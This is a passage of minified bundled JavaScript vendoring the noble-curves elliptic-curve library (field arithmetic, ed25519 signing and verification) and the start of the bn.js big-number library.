Object.entries(t))r(i,s,!0);return n}const f4=()=>{throw new Error("not implemented")};function Ru(n){const e=new WeakMap;return(t,...r)=>{const i=e.get(t);if(i!==void 0)return i;const s=n(t,...r);return e.set(t,s),s}}const d4=Object.freeze(Object.defineProperty({__proto__:null,aInRange:Wr,abool:ts,abytes:nh,bitGet:c4,bitLen:YA,bitMask:Mw,bitSet:u4,bytesToHex:na,bytesToNumberBE:Go,bytesToNumberLE:fl,concatBytes:ra,createHmacDrbg:ZA,ensureBytes:cn,equalBytes:a4,hexToBytes:bl,hexToNumber:Rw,inRange:gp,isBytes:ta,memoized:Ru,notImplemented:f4,numberToBytesBE:xl,numberToBytesLE:Cu,numberToHexUnpadded:tl,numberToVarBytesBE:o4,utf8ToBytes:l4,validateObject:Gl},Symbol.toStringTag,{value:"Module"}));/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Tn=BigInt(0),Ht=BigInt(1),Lo=BigInt(2),p4=BigInt(3),x0=BigInt(4),eE=BigInt(5),tE=BigInt(8);function Ut(n,e){const t=n%e;return t>=Tn?t:e+t}function g4(n,e,t){if(e<Tn)throw new Error("invalid exponent, negatives unsupported");if(t<=Tn)throw new Error("invalid modulus");if(t===Ht)return Tn;let r=Ht;for(;e>Tn;)e&Ht&&(r=r*n%t),n=n*n%t,e>>=Ht;return r}function Xt(n,e,t){let r=n;for(;e-- >Tn;)r*=r,r%=t;return r}function k0(n,e){if(n===Tn)throw new Error("invert: expected non-zero number");if(e<=Tn)throw new Error("invert: expected positive modulus, got "+e);let t=Ut(n,e),r=e,i=Tn,s=Ht;for(;t!==Tn;){const a=r/t,l=r%t,u=i-s*a;r=t,t=l,i=s,s=u}if(r!==Ht)throw new Error("invert: does not exist");return Ut(i,e)}function m4(n){const e=(n-Ht)/Lo;let t,r,i;for(t=n-Ht,r=0;t%Lo===Tn;t/=Lo,r++);for(i=Lo;i<n&&g4(i,e,n)!==n-Ht;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(r===1){const o=(n+Ht)/x0;return function(l,u){const h=l.pow(u,o);if(!l.eql(l.sqr(h),u))throw new Error("Cannot find square root");return h}}const s=(t+Ht)/Lo;return function(a,l){if(a.pow(l,e)===a.neg(a.ONE))throw new Error("Cannot find square root");let u=r,h=a.pow(a.mul(a.ONE,i),t),f=a.pow(l,s),m=a.pow(l,t);for(;!a.eql(m,a.ONE);){if(a.eql(m,a.ZERO))return a.ZERO;let v=1;for(let k=a.sqr(m);v<u&&!a.eql(k,a.ONE);v++)k=a.sqr(k);const x=a.pow(h,Ht<<BigInt(u-v-1));h=a.sqr(x),f=a.mul(f,x),m=a.mul(m,h),u=v}return f}}function y4(n){if(n%x0===p4){const e=(n+Ht)/x0;return function(r,i){const s=r.pow(i,e);if(!r.eql(r.sqr(s),i))throw new Error("Cannot find square root");return s}}if(n%tE===eE){const e=(n-eE)/tE;return function(r,i){const s=r.mul(i,Lo),o=r.pow(s,e),a=r.mul(i,o),l=r.mul(r.mul(a,Lo),o),u=r.mul(a,r.sub(l,r.ONE));if(!r.eql(r.sqr(u),i))throw new Error("Cannot find square root");return u}}return m4(n)}const w4=(n,e)=>(Ut(n,e)&Ht)===Ht,v4=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function _4(n){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},t=v4.reduce((r,i)=>(r[i]="function",r),e);return Gl(n,t)}function E4(n,e,t){if(t<Tn)throw new Error("invalid exponent, negatives unsupported");if(t===Tn)return n.ONE;if(t===Ht)return e;let r=n.ONE,i=e;for(;t>Tn;)t&Ht&&(r=n.mul(r,i)),i=n.sqr(i),t>>=Ht;return r}function I4(n,e){const t=new Array(e.length),r=e.reduce((s,o,a)=>n.is0(o)?s:(t[a]=s,n.mul(s,o)),n.ONE),i=n.inv(r);return e.reduceRight((s,o,a)=>n.is0(o)?s:(t[a]=n.mul(s,t[a]),n.mul(s,o)),i),t}function JA(n,e){const t=e!==void 0?e:n.toString(2).length,r=Math.ceil(t/8);return{nBitLength:t,nByteLength:r}}function mp(n,e,t=!1,r={}){if(n<=Tn)throw new Error("invalid field: expected ORDER > 0, got "+n);const{nBitLength:i,nByteLength:s}=JA(n,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:n,isLE:t,BITS:i,BYTES:s,MASK:Mw(i),ZERO:Tn,ONE:Ht,create:l=>Ut(l,n),isValid:l=>{if(typeof l!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof l);return Tn<=l&&l<n},is0:l=>l===Tn,isOdd:l=>(l&Ht)===Ht,neg:l=>Ut(-l,n),eql:(l,u)=>l===u,sqr:l=>Ut(l*l,n),add:(l,u)=>Ut(l+u,n),sub:(l,u)=>Ut(l-u,n),mul:(l,u)=>Ut(l*u,n),pow:(l,u)=>E4(a,l,u),div:(l,u)=>Ut(l*k0(u,n),n),sqrN:l=>l*l,addN:(l,u)=>l+u,subN:(l,u)=>l-u,mulN:(l,u)=>l*u,inv:l=>k0(l,n),sqrt:r.sqrt||(l=>(o||(o=y4(n)),o(a,l))),invertBatch:l=>I4(a,l),cmov:(l,u,h)=>h?u:l,toBytes:l=>t?Cu(l,s):xl(l,s),fromBytes:l=>{if(l.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+l.length);return t?fl(l):Go(l)}});return Object.freeze(a)}function XA(n){if(typeof n!="bigint")throw new Error("field order must be bigint");const e=n.toString(2).length;return Math.ceil(e/8)}function eb(n){const e=XA(n);return e+Math.ceil(e/2)}function S4(n,e,t=!1){const r=n.length,i=XA(e),s=eb(e);if(r<16||r<s||r>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+r);const o=t?fl(n):Go(n),a=Ut(o,e-Ht)+Ht;return t?Cu(a,i):xl(a,i)}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const nE=BigInt(0),Yh=BigInt(1);function Fg(n,e){const t=e.negate();return n?t:e}function tb(n,e){if(!Number.isSafeInteger(n)||n<=0||n>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+n)}function zg(n,e){tb(n,e);const t=Math.ceil(e/n)+1,r=2**(n-1);return{windows:t,windowSize:r}}function T4(n,e){if(!Array.isArray(n))throw new Error("array expected");n.forEach((t,r)=>{if(!(t instanceof e))throw new Error("invalid point at index "+r)})}function A4(n,e){if(!Array.isArray(n))throw new Error("array of scalars expected");n.forEach((t,r)=>{if(!e.isValid(t))throw new Error("invalid scalar at index "+r)})}const Wg=new WeakMap,nb=new WeakMap;function $g(n){return nb.get(n)||1}function rb(n,e){return{constTimeNegate:Fg,hasPrecomputes(t){return $g(t)!==1},unsafeLadder(t,r,i=n.ZERO){let s=t;for(;r>nE;)r&Yh&&(i=i.add(s)),s=s.double(),r>>=Yh;return i},precomputeWindow(t,r){const{windows:i,windowSize:s}=zg(r,e),o=[];let a=t,l=a;for(let u=0;u<i;u++){l=a,o.push(l);for(let h=1;h<s;h++)l=l.add(a),o.push(l);a=l.double()}return o},wNAF(t,r,i){const{windows:s,windowSize:o}=zg(t,e);let a=n.ZERO,l=n.BASE;const u=BigInt(2**t-1),h=2**t,f=BigInt(t);for(let m=0;m<s;m++){const v=m*o;let x=Number(i&u);i>>=f,x>o&&(x-=h,i+=Yh);const k=v,I=v+Math.abs(x)-1,S=m%2!==0,b=x<0;x===0?l=l.add(Fg(S,r[k])):a=a.add(Fg(b,r[I]))}return{p:a,f:l}},wNAFUnsafe(t,r,i,s=n.ZERO){const{windows:o,windowSize:a}=zg(t,e),l=BigInt(2**t-1),u=2**t,h=BigInt(t);for(let f=0;f<o;f++){const m=f*a;if(i===nE)break;let v=Number(i&l);if(i>>=h,v>a&&(v-=u,i+=Yh),v===0)continue;let x=r[m+Math.abs(v)-1];v<0&&(x=x.negate()),s=s.add(x)}return s},getPrecomputes(t,r,i){let s=Wg.get(r);return s||(s=this.precomputeWindow(r,t),t!==1&&Wg.set(r,i(s))),s},wNAFCached(t,r,i){const s=$g(t);return this.wNAF(s,this.getPrecomputes(s,t,i),r)},wNAFCachedUnsafe(t,r,i,s){const o=$g(t);return o===1?this.unsafeLadder(t,r,s):this.wNAFUnsafe(o,this.getPrecomputes(o,t,i),r,s)},setWindowSize(t,r){tb(r,e),nb.set(t,r),Wg.delete(t)}}}function ib(n,e,t,r){if(T4(t,n),A4(r,e),t.length!==r.length)throw new Error("arrays of points and scalars must have equal length");const i=n.ZERO,s=YA(BigInt(t.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,l=new Array(a+1).fill(i),u=Math.floor((e.BITS-1)/o)*o;let h=i;for(let f=u;f>=0;f-=o){l.fill(i);for(let v=0;v<r.length;v++){const x=r[v],k=Number(x>>BigInt(f)&BigInt(a));l[k]=l[k].add(t[v])}let m=i;for(let v=l.length-1,x=i;v>0;v--)x=x.add(l[v]),m=m.add(x);if(h=h.add(m),f!==0)for(let v=0;v<o;v++)h=h.double()}return h}function Nw(n){return _4(n.Fp),Gl(n,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...JA(n.n,n.nBitLength),...n,p:n.Fp.ORDER})}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Jr=BigInt(0),ur=BigInt(1),Zh=BigInt(2),b4=BigInt(8),x4={zip215:!0};function k4(n){const e=Nw(n);return Gl(n,{hash:"function",a:"bigint",d:"bigint",randomBytes:"function"},{adjustScalarBytes:"function",domain:"function",uvRatio:"function",mapToCurve:"function"}),Object.freeze({...e})}function C4(n){const e=k4(n),{Fp:t,n:r,prehash:i,hash:s,randomBytes:o,nByteLength:a,h:l}=e,u=Zh<<BigInt(a*8)-ur,h=t.create,f=mp(e.n,e.nBitLength),m=e.uvRatio||((C,M)=>{try{return{isValid:!0,value:t.sqrt(C*t.inv(M))}}catch{return{isValid:!1,value:Jr}}}),v=e.adjustScalarBytes||(C=>C),x=e.domain||((C,M,R)=>{if(ts("phflag",R),M.length||R)throw new Error("Contexts/pre-hash are not supported");return C});function k(C,M){Wr("coordinate "+C,M,Jr,u)}function I(C){if(!(C instanceof E))throw new Error("ExtendedPoint expected")}const S=Ru((C,M)=>{const{ex:R,ey:j,ez:$}=C,D=C.is0();M==null&&(M=D?b4:t.inv($));const y=h(R*M),V=h(j*M),oe=h($*M);if(D)return{x:Jr,y:ur};if(oe!==ur)throw new Error("invZ was invalid");return{x:y,y:V}}),b=Ru(C=>{const{a:M,d:R}=e;if(C.is0())throw new Error("bad point: ZERO");const{ex:j,ey:$,ez:D,et:y}=C,V=h(j*j),oe=h($*$),le=h(D*D),he=h(le*le),ke=h(V*M),Te=h(le*h(ke+oe)),Ne=h(he+h(R*h(V*oe)));if(Te!==Ne)throw new Error("bad point: equation left != right (1)");const gt=h(j*$),je=h(D*y);if(gt!==je)throw new Error("bad point: equation left != right (2)");return!0});class E{constructor(M,R,j,$){this.ex=M,this.ey=R,this.ez=j,this.et=$,k("x",M),k("y",R),k("z",j),k("t",$),Object.freeze(this)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static fromAffine(M){if(M instanceof E)throw new Error("extended point not allowed");const{x:R,y:j}=M||{};return k("x",R),k("y",j),new E(R,j,ur,h(R*j))}static normalizeZ(M){const R=t.invertBatch(M.map(j=>j.ez));return M.map((j,$)=>j.toAffine(R[$])).map(E.fromAffine)}static msm(M,R){return ib(E,f,M,R)}_setWindowSize(M){q.setWindowSize(this,M)}assertValidity(){b(this)}equals(M){I(M);const{ex:R,ey:j,ez:$}=this,{ex:D,ey:y,ez:V}=M,oe=h(R*V),le=h(D*$),he=h(j*V),ke=h(y*$);return oe===le&&he===ke}is0(){return this.equals(E.ZERO)}negate(){return new E(h(-this.ex),this.ey,this.ez,h(-this.et))}double(){const{a:M}=e,{ex:R,ey:j,ez:$}=this,D=h(R*R),y=h(j*j),V=h(Zh*h($*$)),oe=h(M*D),le=R+j,he=h(h(le*le)-D-y),ke=oe+y,Te=ke-V,Ne=oe-y,gt=h(he*Te),je=h(ke*Ne),Ue=h(he*Ne),Pt=h(Te*ke);return new E(gt,je,Pt,Ue)}add(M){I(M);const{a:R,d:j}=e,{ex:$,ey:D,ez:y,et:V}=this,{ex:oe,ey:le,ez:he,et:ke}=M;if(R===BigInt(-1)){const at=h((D-$)*(le+oe)),Xe=h((D+$)*(le-oe)),on=h(Xe-at);if(on===Jr)return this.double();const lt=h(y*Zh*ke),ct=h(V*Zh*he),wn=ct+lt,ut=Xe+at,P=ct-lt,g=h(wn*on),w=h(ut*P),F=h(wn*P),G=h(on*ut);return new E(g,w,G,F)}const Te=h($*oe),Ne=h(D*le),gt=h(V*j*ke),je=h(y*he),Ue=h(($+D)*(oe+le)-Te-Ne),Pt=je-gt,We=je+gt,Ke=h(Ne-R*Te),Di=h(Ue*Pt),ot=h(We*Ke),vt=h(Ue*Ke),Oi=h(Pt*We);return new E(Di,ot,Oi,vt)}subtract(M){return this.add(M.negate())}wNAF(M){return q.wNAFCached(this,M,E.normalizeZ)}multiply(M){const R=M;Wr("scalar",R,ur,r);const{p:j,f:$}=this.wNAF(R);return E.normalizeZ([j,$])[0]}multiplyUnsafe(M,R=E.ZERO){const j=M;return Wr("scalar",j,Jr,r),j===Jr?H:this.is0()||j===ur?this:q.wNAFCachedUnsafe(this,j,E.normalizeZ,R)}isSmallOrder(){return this.multiplyUnsafe(l).is0()}isTorsionFree(){return q.unsafeLadder(this,r).is0()}toAffine(M){return S(this,M)}clearCofactor(){const{h:M}=e;return M===ur?this:this.multiplyUnsafe(M)}static fromHex(M,R=!1){const{d:j,a:$}=e,D=t.BYTES;M=cn("pointHex",M,D),ts("zip215",R);const y=M.slice(),V=M[D-1];y[D-1]=V&-129;const oe=fl(y),le=R?u:t.ORDER;Wr("pointHex.y",oe,Jr,le);const he=h(oe*oe),ke=h(he-ur),Te=h(j*he-$);let{isValid:Ne,value:gt}=m(ke,Te);if(!Ne)throw new Error("Point.fromHex: invalid y coordinate");const je=(gt&ur)===ur,Ue=(V&128)!==0;if(!R&&gt===Jr&&Ue)throw new Error("Point.fromHex: x=0 and x_0=1");return Ue!==je&&(gt=h(-gt)),E.fromAffine({x:gt,y:oe})}static fromPrivateKey(M){return B(M).point}toRawBytes(){const{x:M,y:R}=this.toAffine(),j=Cu(R,t.BYTES);return j[j.length-1]|=M&ur?128:0,j}toHex(){return na(this.toRawBytes())}}E.BASE=new E(e.Gx,e.Gy,ur,h(e.Gx*e.Gy)),E.ZERO=new E(Jr,ur,ur,Jr);const{BASE:U,ZERO:H}=E,q=rb(E,a*8);function L(C){return Ut(C,r)}function N(C){return L(fl(C))}function B(C){const M=t.BYTES;C=cn("private key",C,M);const R=cn("hashed private key",s(C),2*M),j=v(R.slice(0,M)),$=R.slice(M,2*M),D=N(j),y=U.multiply(D),V=y.toRawBytes();return{head:j,prefix:$,scalar:D,point:y,pointBytes:V}}function z(C){return B(C).pointBytes}function W(C=new Uint8Array,...M){const R=ra(...M);return N(s(x(R,cn("context",C),!!i)))}function K(C,M,R={}){C=cn("message",C),i&&(C=i(C));const{prefix:j,scalar:$,pointBytes:D}=B(M),y=W(R.context,j,C),V=U.multiply(y).toRawBytes(),oe=W(R.context,V,D,C),le=L(y+oe*$);Wr("signature.s",le,Jr,r);const he=ra(V,Cu(le,t.BYTES));return cn("result",he,t.BYTES*2)}const T=x4;function d(C,M,R,j=T){const{context:$,zip215:D}=j,y=t.BYTES;C=cn("signature",C,2*y),M=cn("message",M),R=cn("publicKey",R,y),D!==void 0&&ts("zip215",D),i&&(M=i(M));const V=fl(C.slice(y,2*y));let oe,le,he;try{oe=E.fromHex(R,D),le=E.fromHex(C.slice(0,y),D),he=U.multiplyUnsafe(V)}catch{return!1}if(!D&&oe.isSmallOrder())return!1;const ke=W($,le.toRawBytes(),oe.toRawBytes(),M);return le.add(oe.multiplyUnsafe(ke)).subtract(he).clearCofactor().equals(E.ZERO)}return U._setWindowSize(8),{CURVE:e,getPublicKey:z,sign:K,verify:d,ExtendedPoint:E,utils:{getExtendedPublicKey:B,randomPrivateKey:()=>o(t.BYTES),precompute(C=8,M=E.BASE){return M._setWindowSize(C),M.multiply(BigInt(3)),M}}}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Pw=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949"),rE=BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");BigInt(0);const R4=BigInt(1),iE=BigInt(2);BigInt(3);const M4=BigInt(5),N4=BigInt(8);function P4(n){const e=BigInt(10),t=BigInt(20),r=BigInt(40),i=BigInt(80),s=Pw,a=n*n%s*n%s,l=Xt(a,iE,s)*a%s,u=Xt(l,R4,s)*n%s,h=Xt(u,M4,s)*u%s,f=Xt(h,e,s)*h%s,m=Xt(f,t,s)*f%s,v=Xt(m,r,s)*m%s,x=Xt(v,i,s)*v%s,k=Xt(x,i,s)*v%s,I=Xt(k,e,s)*h%s;return{pow_p_5_8:Xt(I,iE,s)*n%s,b2:a}}function L4(n){return n[0]&=248,n[31]&=127,n[31]|=64,n}function D4(n,e){const t=Pw,r=Ut(e*e*e,t),i=Ut(r*r*e,t),s=P4(n*i).pow_p_5_8;let o=Ut(n*r*s,t);const a=Ut(e*o*o,t),l=o,u=Ut(o*rE,t),h=a===n,f=a===Ut(-n,t),m=a===Ut(-n*rE,t);return h&&(o=l),(f||m)&&(o=u),w4(o,t)&&(o=Ut(-o,t)),{isValid:h||f,value:o}}const O4=(()=>mp(Pw,void 0,!0))(),B4=(()=>({a:BigInt(-1),d:BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),Fp:O4,n:BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),h:N4,Gx:BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),Gy:BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),hash:r4,randomBytes:KA,adjustScalarBytes:L4,uvRatio:D4}))(),yp=(()=>C4(B4))();var Lw={exports:{}};const U4={},j4=Object.freeze(Object.defineProperty({__proto__:null,default:U4},Symbol.toStringTag,{value:"Module"})),V4=Ry(j4);Lw.exports;(function(n){(function(e,t){function r(T,d){if(!T)throw new Error(d||"Assertion failed")}function i(T,d){T.super_=d;var _=function(){};_.prototype=d.prototype,T.prototype=new _,T.prototype.constructor=T}function s(T,d,_){if(s.isBN(T))return T;this.negative=0,this.words=null,this.length=0,this.red=null,T!==null&&((d==="le"||d==="be")&&(_=d,d=10),this._init(T||0,d||10,_||"be"))}typeof e=="object"?e.exports=s:t.BN=s,s.BN=s,s.wordSize=26;var o;try{typeof window<"u"&&typeof window.Buffer<"u"?o=window.Buffer:o=V4.Buffer}catch{}s.isBN=function(d){return d instanceof s?!0:d!==null&&typeof d=="object"&&d.constructor.wordSize===s.wordSize&&Array.isArray(d.words)},s.max=function(d,_){return d.cmp(_)>0?d:_},s.min=function(d,_){return d.cmp(_)<0?d:_},s.prototype._init=function(d,_,C){if(typeof d=="number")return this._initNumber(d,_,C);if(typeof d=="object")return this._initArray(d,_,C);_==="hex"&&(_=16),r(_===(_|0)&&_>=2&&_<=36),d=d.toString().replace(/\s+/g,"");var M=0;d[0]==="-"&&(M++,this.negative=1),M<d.length&&(_===16?this._parseHex(d,M,C):(this._parseBase(d,_,M),C==="le"&&this._initArray(this.toArray(),_,C)))},s.prototype._initNumber=function(d,_,C){d<0&&(this.negative=1,d=-d),d<67108864?(this.words=[d&67108863],this.length=1):d<4503599627370496?(this.words=[d&67108863,d/67108864&67108863],this.length=2):(r(d<9007199254740992),this.words=[d&67108863,d/67108864&67108863,1],this.length=3),C==="le"&&this._initArray(this.toArray(),_,C)},s.prototype._initArray=function(d,_,C){if(r(typeof d.length=="number"),d.length<=0)return this.words=[0],this.length=1,this;this.length=Math.ceil(d.length/3),this.words=new Array(this.length);for(var M=0;M<this.length;M++)this.words[M]=0;var R,j,$=0;if(C==="be")for(M=d.length-1,R=0;M>=0;M-=3)j=d[M]|d[M-1]<<8|d[M-2]<<16,this.words[R]|=j<<$&67108863,this.words[R+1]=j>>>26-$&67108863,$+=24,$>=26&&($-=26,R++);else if(C==="le")for(M=0,R=0;M<d.length;M+=3)j=d[M]|d[M+1]<<8|d[M+2]<<16,this.words[R]|=j<<$&67108863,this.words[R+1]=j>>>26-$&67108863,$+=24,$>=26&&($-=26,R++);return this._strip()};function a(T,d){var _=T.charCodeAt(d);if(_>=48&&_<=57)return _-48;if(_>=65&&_<=70)return _-55;if(_>=97&&_<=102)return _-87;r(!1,"Invalid character in "+T)}function l(T,d,_){var C=a(T,_);return _-1>=d&&(C|=a(T,_-1)<<4),C}s.prototype._parseHex=function(d,_,C){this.length=Math.ceil((d.length-_)/6),this.words=new Array(this.length);for(var M=0;M<this.length;M++)this.words[M]=0;var R=0,j=0,$;if(C==="be")for(M=d.length-1;M>=_;M-=2)$=l(d,_,M)<<R,this.words[j]|=$&67108863,R>=18?(R-=18,j+=1,this.words[j]|=$>>>26):R+=8;else{var D=d.length-_;for(M=D%2===0?_+1:_;M<d.length;M+=2)$=l(d,_,M)<<R,this.words[j]|=$&67108863,R>=18?(R-=18,j+=1,this.words[j]|=$>>>26):R+=8}this._strip()};function u(T,d,_,C){for(var M=0,R=0,j=Math.min(T.length,_),$=d;$<j;$++){var D=T.charCodeAt($)-48;M*=C,D>=49?R=D-49+10:D>=17?R=D-17+10:R=D,r(D>=0&&R<C,"Invalid character"),M+=R}return M}s.prototype._parseBase=function(d,_,C){this.words=[0],this.length=1;for(var M=0,R=1;R<=67108863;R*=_)M++;M--,R=R/_|0;for(var j=d.length-C,$=j%M,D=Math.min(j,j-$)+C,y=0,V=C;V<D;V+=M)y=u(d,V,V+M,_),this.imuln(R),this.words[0]+y<67108864?this.words[0]+=y:this._iaddn(y);if($!==0){var oe=1;for(y=u(d,V,d.length,_),V=0;V<$;V++)oe*=_;this.imuln(oe),this.words[0]+y<67108864?this.words[0]+=y:this._iaddn(y)}this._strip()},s.prototype.copy=function(d){d.words=new Array(this.length);for(var _=0;_<this.length;_++)d.words[_]=this.words[_];d.length=this.length,d.negative=this.negative,d.red=this.red};function h(T,d){T.words=d.words,T.length=d.length,T.negative=d.negative,T.red=d.red}if(s.prototype._move=function(d){h(d,this)},s.prototype.clone=function(){var d=new s(null);return this.copy(d),d},s.prototype._expand=function(d){for(;this.length<d;)this.words[this.length++]=0;return this},s.prototype._strip=function(){for(;this.length>1&&this.words[this.length-1]===0;)this.length--;return this._normSign()},s.prototype._normSign=function(){return this.length===1&&this.words[0]===0&&(this.negative=0),this},typeof Symbol<"u"&&typeof Symbol.for=="function")try{s.prototype[Symbol.for("nodejs.util.inspect.custom")]=f}catch{s.prototype.inspect=f}else s.prototype.inspect=f;function f(){return(this.red?"<BN-R: ":"<BN: ")+this.toString(16)+">"}var m=["","0","00","000","0000","00000","000000","0000000","00000000","000000000","0000000000","00000000000","000000000000","0000000000000","00000000000000","000000000000000","0000000000000000","00000000000000000","000000000000000000","0000000000000000000","00000000000000000000","000000000000000000000","0000000000000000000000","00000000000000000000000","000000000000000000000000","0000000000000000000000000"],v=[0,0,25,16,12,11,10,9,8,8,7,7,7,7,6,6,6,6,6,6,6,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5],x=[0,0,33554432,43046721,16777216,48828125,60466176,40353607,16777216,43046721,1e7,19487171,35831808,62748517,7529536,11390625,16777216,24137569,34012224,47045881,64e6,4084101,5153632,6436343,7962624,9765625,11881376,14348907,17210368,20511149,243e5,28629151,33554432,39135393,45435424,52521875,60466176];s.prototype.toString=function(d,_){d=d||10,_=_|0||1;var C;if(d===16||d==="hex"){C="";for(var M=0,R=0,j=0;j<this.length;j++){var $=this.words[j],D=(($<<M|R)&16777215).toString(16);R=$>>>24-M&16777215,M+=2,M>=26&&(M-=26,j--),R!==0||j!==this.length-1?C=m[6-D.length]+D+C:C=D+C}for(R!==0&&(C=R.toString(16)+C);C.length%_!==0;)C="0"+C;return this.negative!==0&&(C="-"+C),C}if(d===(d|0)&&d>=2&&d<=36){var y=v[d],V=x[d];C="";var oe=this.clone();for(oe.negative=0;!oe.isZero();){var le=oe.modrn(V).toString(d);oe=oe.idivn(V),oe.isZero()?C=le+C:C=m[y-le.length]+le+C}for(this.isZero()&&(C="0"+C);C.length%_!==0;)C="0"+C;return this.negative!==0&&(C="-"+C),C}r(!1,"Base should be between 2 and 36")},s.prototype.toNumber=function(){var d=this.words[0];return this.length===2?d+=this.words[1]*67108864:this.length===3&&this.words[2]===1?d+=4503599627370496+this.words[1]*67108864:this.length>2&&r(!1,"Number can only safely store up to 53 bits"),this.negative!==0?-d:d},s.prototype.toJSON=function(){return this.toString(16,2)},o&&(s.prototype.toBuffer=function(d,_){return this.toArrayLike(o,d,_)}),s.prototype.toArray=function(d,_){return this.toArrayLike(Array,d,_)};var k=function(d,_){return d.allocUnsafe?d.allocUnsafe(_):new d(_)};s.prototype.toArrayLike=function(d,_,C){this._strip();var M=this.byteLength(),R=C||Math.max(1,M);r(M<=R,"byte array longer than desired length"),r(R>0,"Requested array length <= 0");var j=k(d,R),$=_==="le"?"LE":"BE";return this["_toArrayLike"+$](j,M),j},s.prototype._toArrayLikeLE=function(d,_){for(var C=0,M=0,R=0,j=0;R<this.length;R++){var $=this.words[R]<<j|M;d[C++]=$&255,C<d.length&&(d[C++]=$>>8&255),C<d.length&&(d[C++]=$>>16&255),j===6?(C<d.length&&(d[C++]=$>>24&255),M=0,j=0):(M=$>>>24,j+=2)}if(C<d.length)for(d[C++]=M;C<d.length;)d[C++]=0},s.prototype._toArrayLikeBE=function(d,_){for(var C=d.length-1,M=0,R=0,j=0;R<this.length;R++){var $=this.words[R]<<j|M;d[C--]=$&255,C>=0&&(d[C--]=$>>8&255),C>=0&&(d[C--]=$>>16&255),j===6?(C>=0&&(d[C--]=$>>24&255),M=0,j=0):(M=$>>>24,j+=2)}if(C>=0)for(d[C--]=M;C>=0;)d[C--]=0},Math.clz32?s.prototype._countBits=function(d){return 32-Math.clz32(d)}:s.prototype._countBits=function(d){var _=d,C=0;return _>=4096&&(C+=13,_>>>=13),_>=64&&(C+=7,_>>>=7),_>=8&&(C+=4,_>>>=4),_>=2&&(C+=2,_>>>=2),C+_},s.prototype._zeroBits=function(d){if(d===0)return 26;var _=d,C=0;return _&8191||(C+=13,_>>>=13),_&127||(C+=7,_>>>=7),_&15||(C+=4,_>>>=4),_&3||(C+=2,_>>>=2),_&1||C++,C},s.prototype.bitLength=function(){var d=this.words[this.length-1],_=this._countBits(d);return(this.length-1)*26+_};function I(T){for(var d=new Array(T.bitLength()),_=0;_<d.length;_++){var C=_/26|0,M=_%26;d[_]=T.words[C]>>>M&1}return d}s.prototype.zeroBits=function(){if(this.isZero())return 0;for(var d=0,_=0;_<this.length;_++){var C=this._zeroBits(this.words[_]);if(d+=C,C!==26)break}return d},s.prototype.byteLength=function(){return Math.ceil(this.bitLength()/8)},s.prototype.toTwos=function(d){return this.negative!==0?this.abs().inotn(d).iaddn(1):this.clone()},s.prototype.fromTwos=function(d){return this.testn(d-1)?this.notn(d).iaddn(1).ineg():this.clone()},s.prototype.isNeg=function(){return this.negative!==0},s.prototype.neg=function(){return this.clone().ineg()},s.prototype.ineg=function(){return this.isZero()||(this.negative^=1),this},s.prototype.iuor=function(d){for(;this.length<d.length;)this.words[this.length++]=0;for(var _=0;_<d.length;_++)this.words[_]=this.words[_]|d.words[_];return this._strip()},s.prototype.ior=function(d){return r((this.negative|d.negative)===0),this.iuor(d)},s.prototype.or=function(d){return this.length>d.length?this.clone().ior(d):d.clone().ior(this)},s.prototype.uor=function(d){return this.length>d.length?this.clone().iuor(d):d.clone().iuor(this)},s.prototype.iuand=function(d){var _;this.length>d.length?_=d:_=this;for(var C=0;C<_.length;C++)this.words[C]=this.words[C]&d.words[C];return this.length=_.length,this._strip()},s.prototype.iand=function(d){return r((this.negative|d.negative)===0),this.iuand(d)},s.prototype.and=function(d){return this.length>d.length?this.clone().iand(d):d.clone().iand(this)},s.prototype.uand=function(d){return this.length>d.length?this.clone().iuand(d):d.clone().iuand(this)},s.prototype.iuxor=function(d){var _,C;this.length>d.length?(_=this,C=d):(_=d,C=this);for(var M=0;M<C.length;M++)this.words[M]=_.words[M]^C.words[M];if(this!==_)for(;M<_.length;M++)this.words[M]=_.words[M];return this.length=_.length,this._strip()},s.prototype.ixor=function(d){return r((this.negative|d.negative)===0),this.iuxor(d)},s.prototype.xor=function(d){return this.length>d.length?this.clone().ixor(d):d.clone().ixor(this)},s.prototype.uxor=function(d){return this.length>d.length?this.clone().iuxor(d):d.clone().iuxor(this)},s.prototype.inotn=function(d){r(typeof d=="number"&&d>=0);var _=Math.ceil(d/26)|0,C=d%26;this._expand(_),C>0&&_--;for(var M=0;M<_;M++)this.words[M]=~this.words[M]&67108863;return C>0&&(this.words[M]=~this.words[M]&67108863>>26-C),this._strip()},s.prototype.notn=function(d){return this.clone().inotn(d)},s.prototype.setn=function(d,_){r(typeof d=="number"&&d>=0);var C=d/26|0,M=d%26;return this._expand(C+1),_?this.words[C]=this.words[C]|1<<M:this.words[C]=this.words[C]&~(1<<M),this._strip()},s.prototype.iadd=function(d){var _;if(this.negative!==0&&d.negative===0)return this.negative=0,_=this.isub(d),this.negative^=1,this._normSign();if(this.negative===0&&d.negative!==0)return d.negative=0,_=this.isub(d),d.negative=1,_._normSign();var C,M;this.length>d.length?(C=this,M=d):(C=d,M=this);for(var 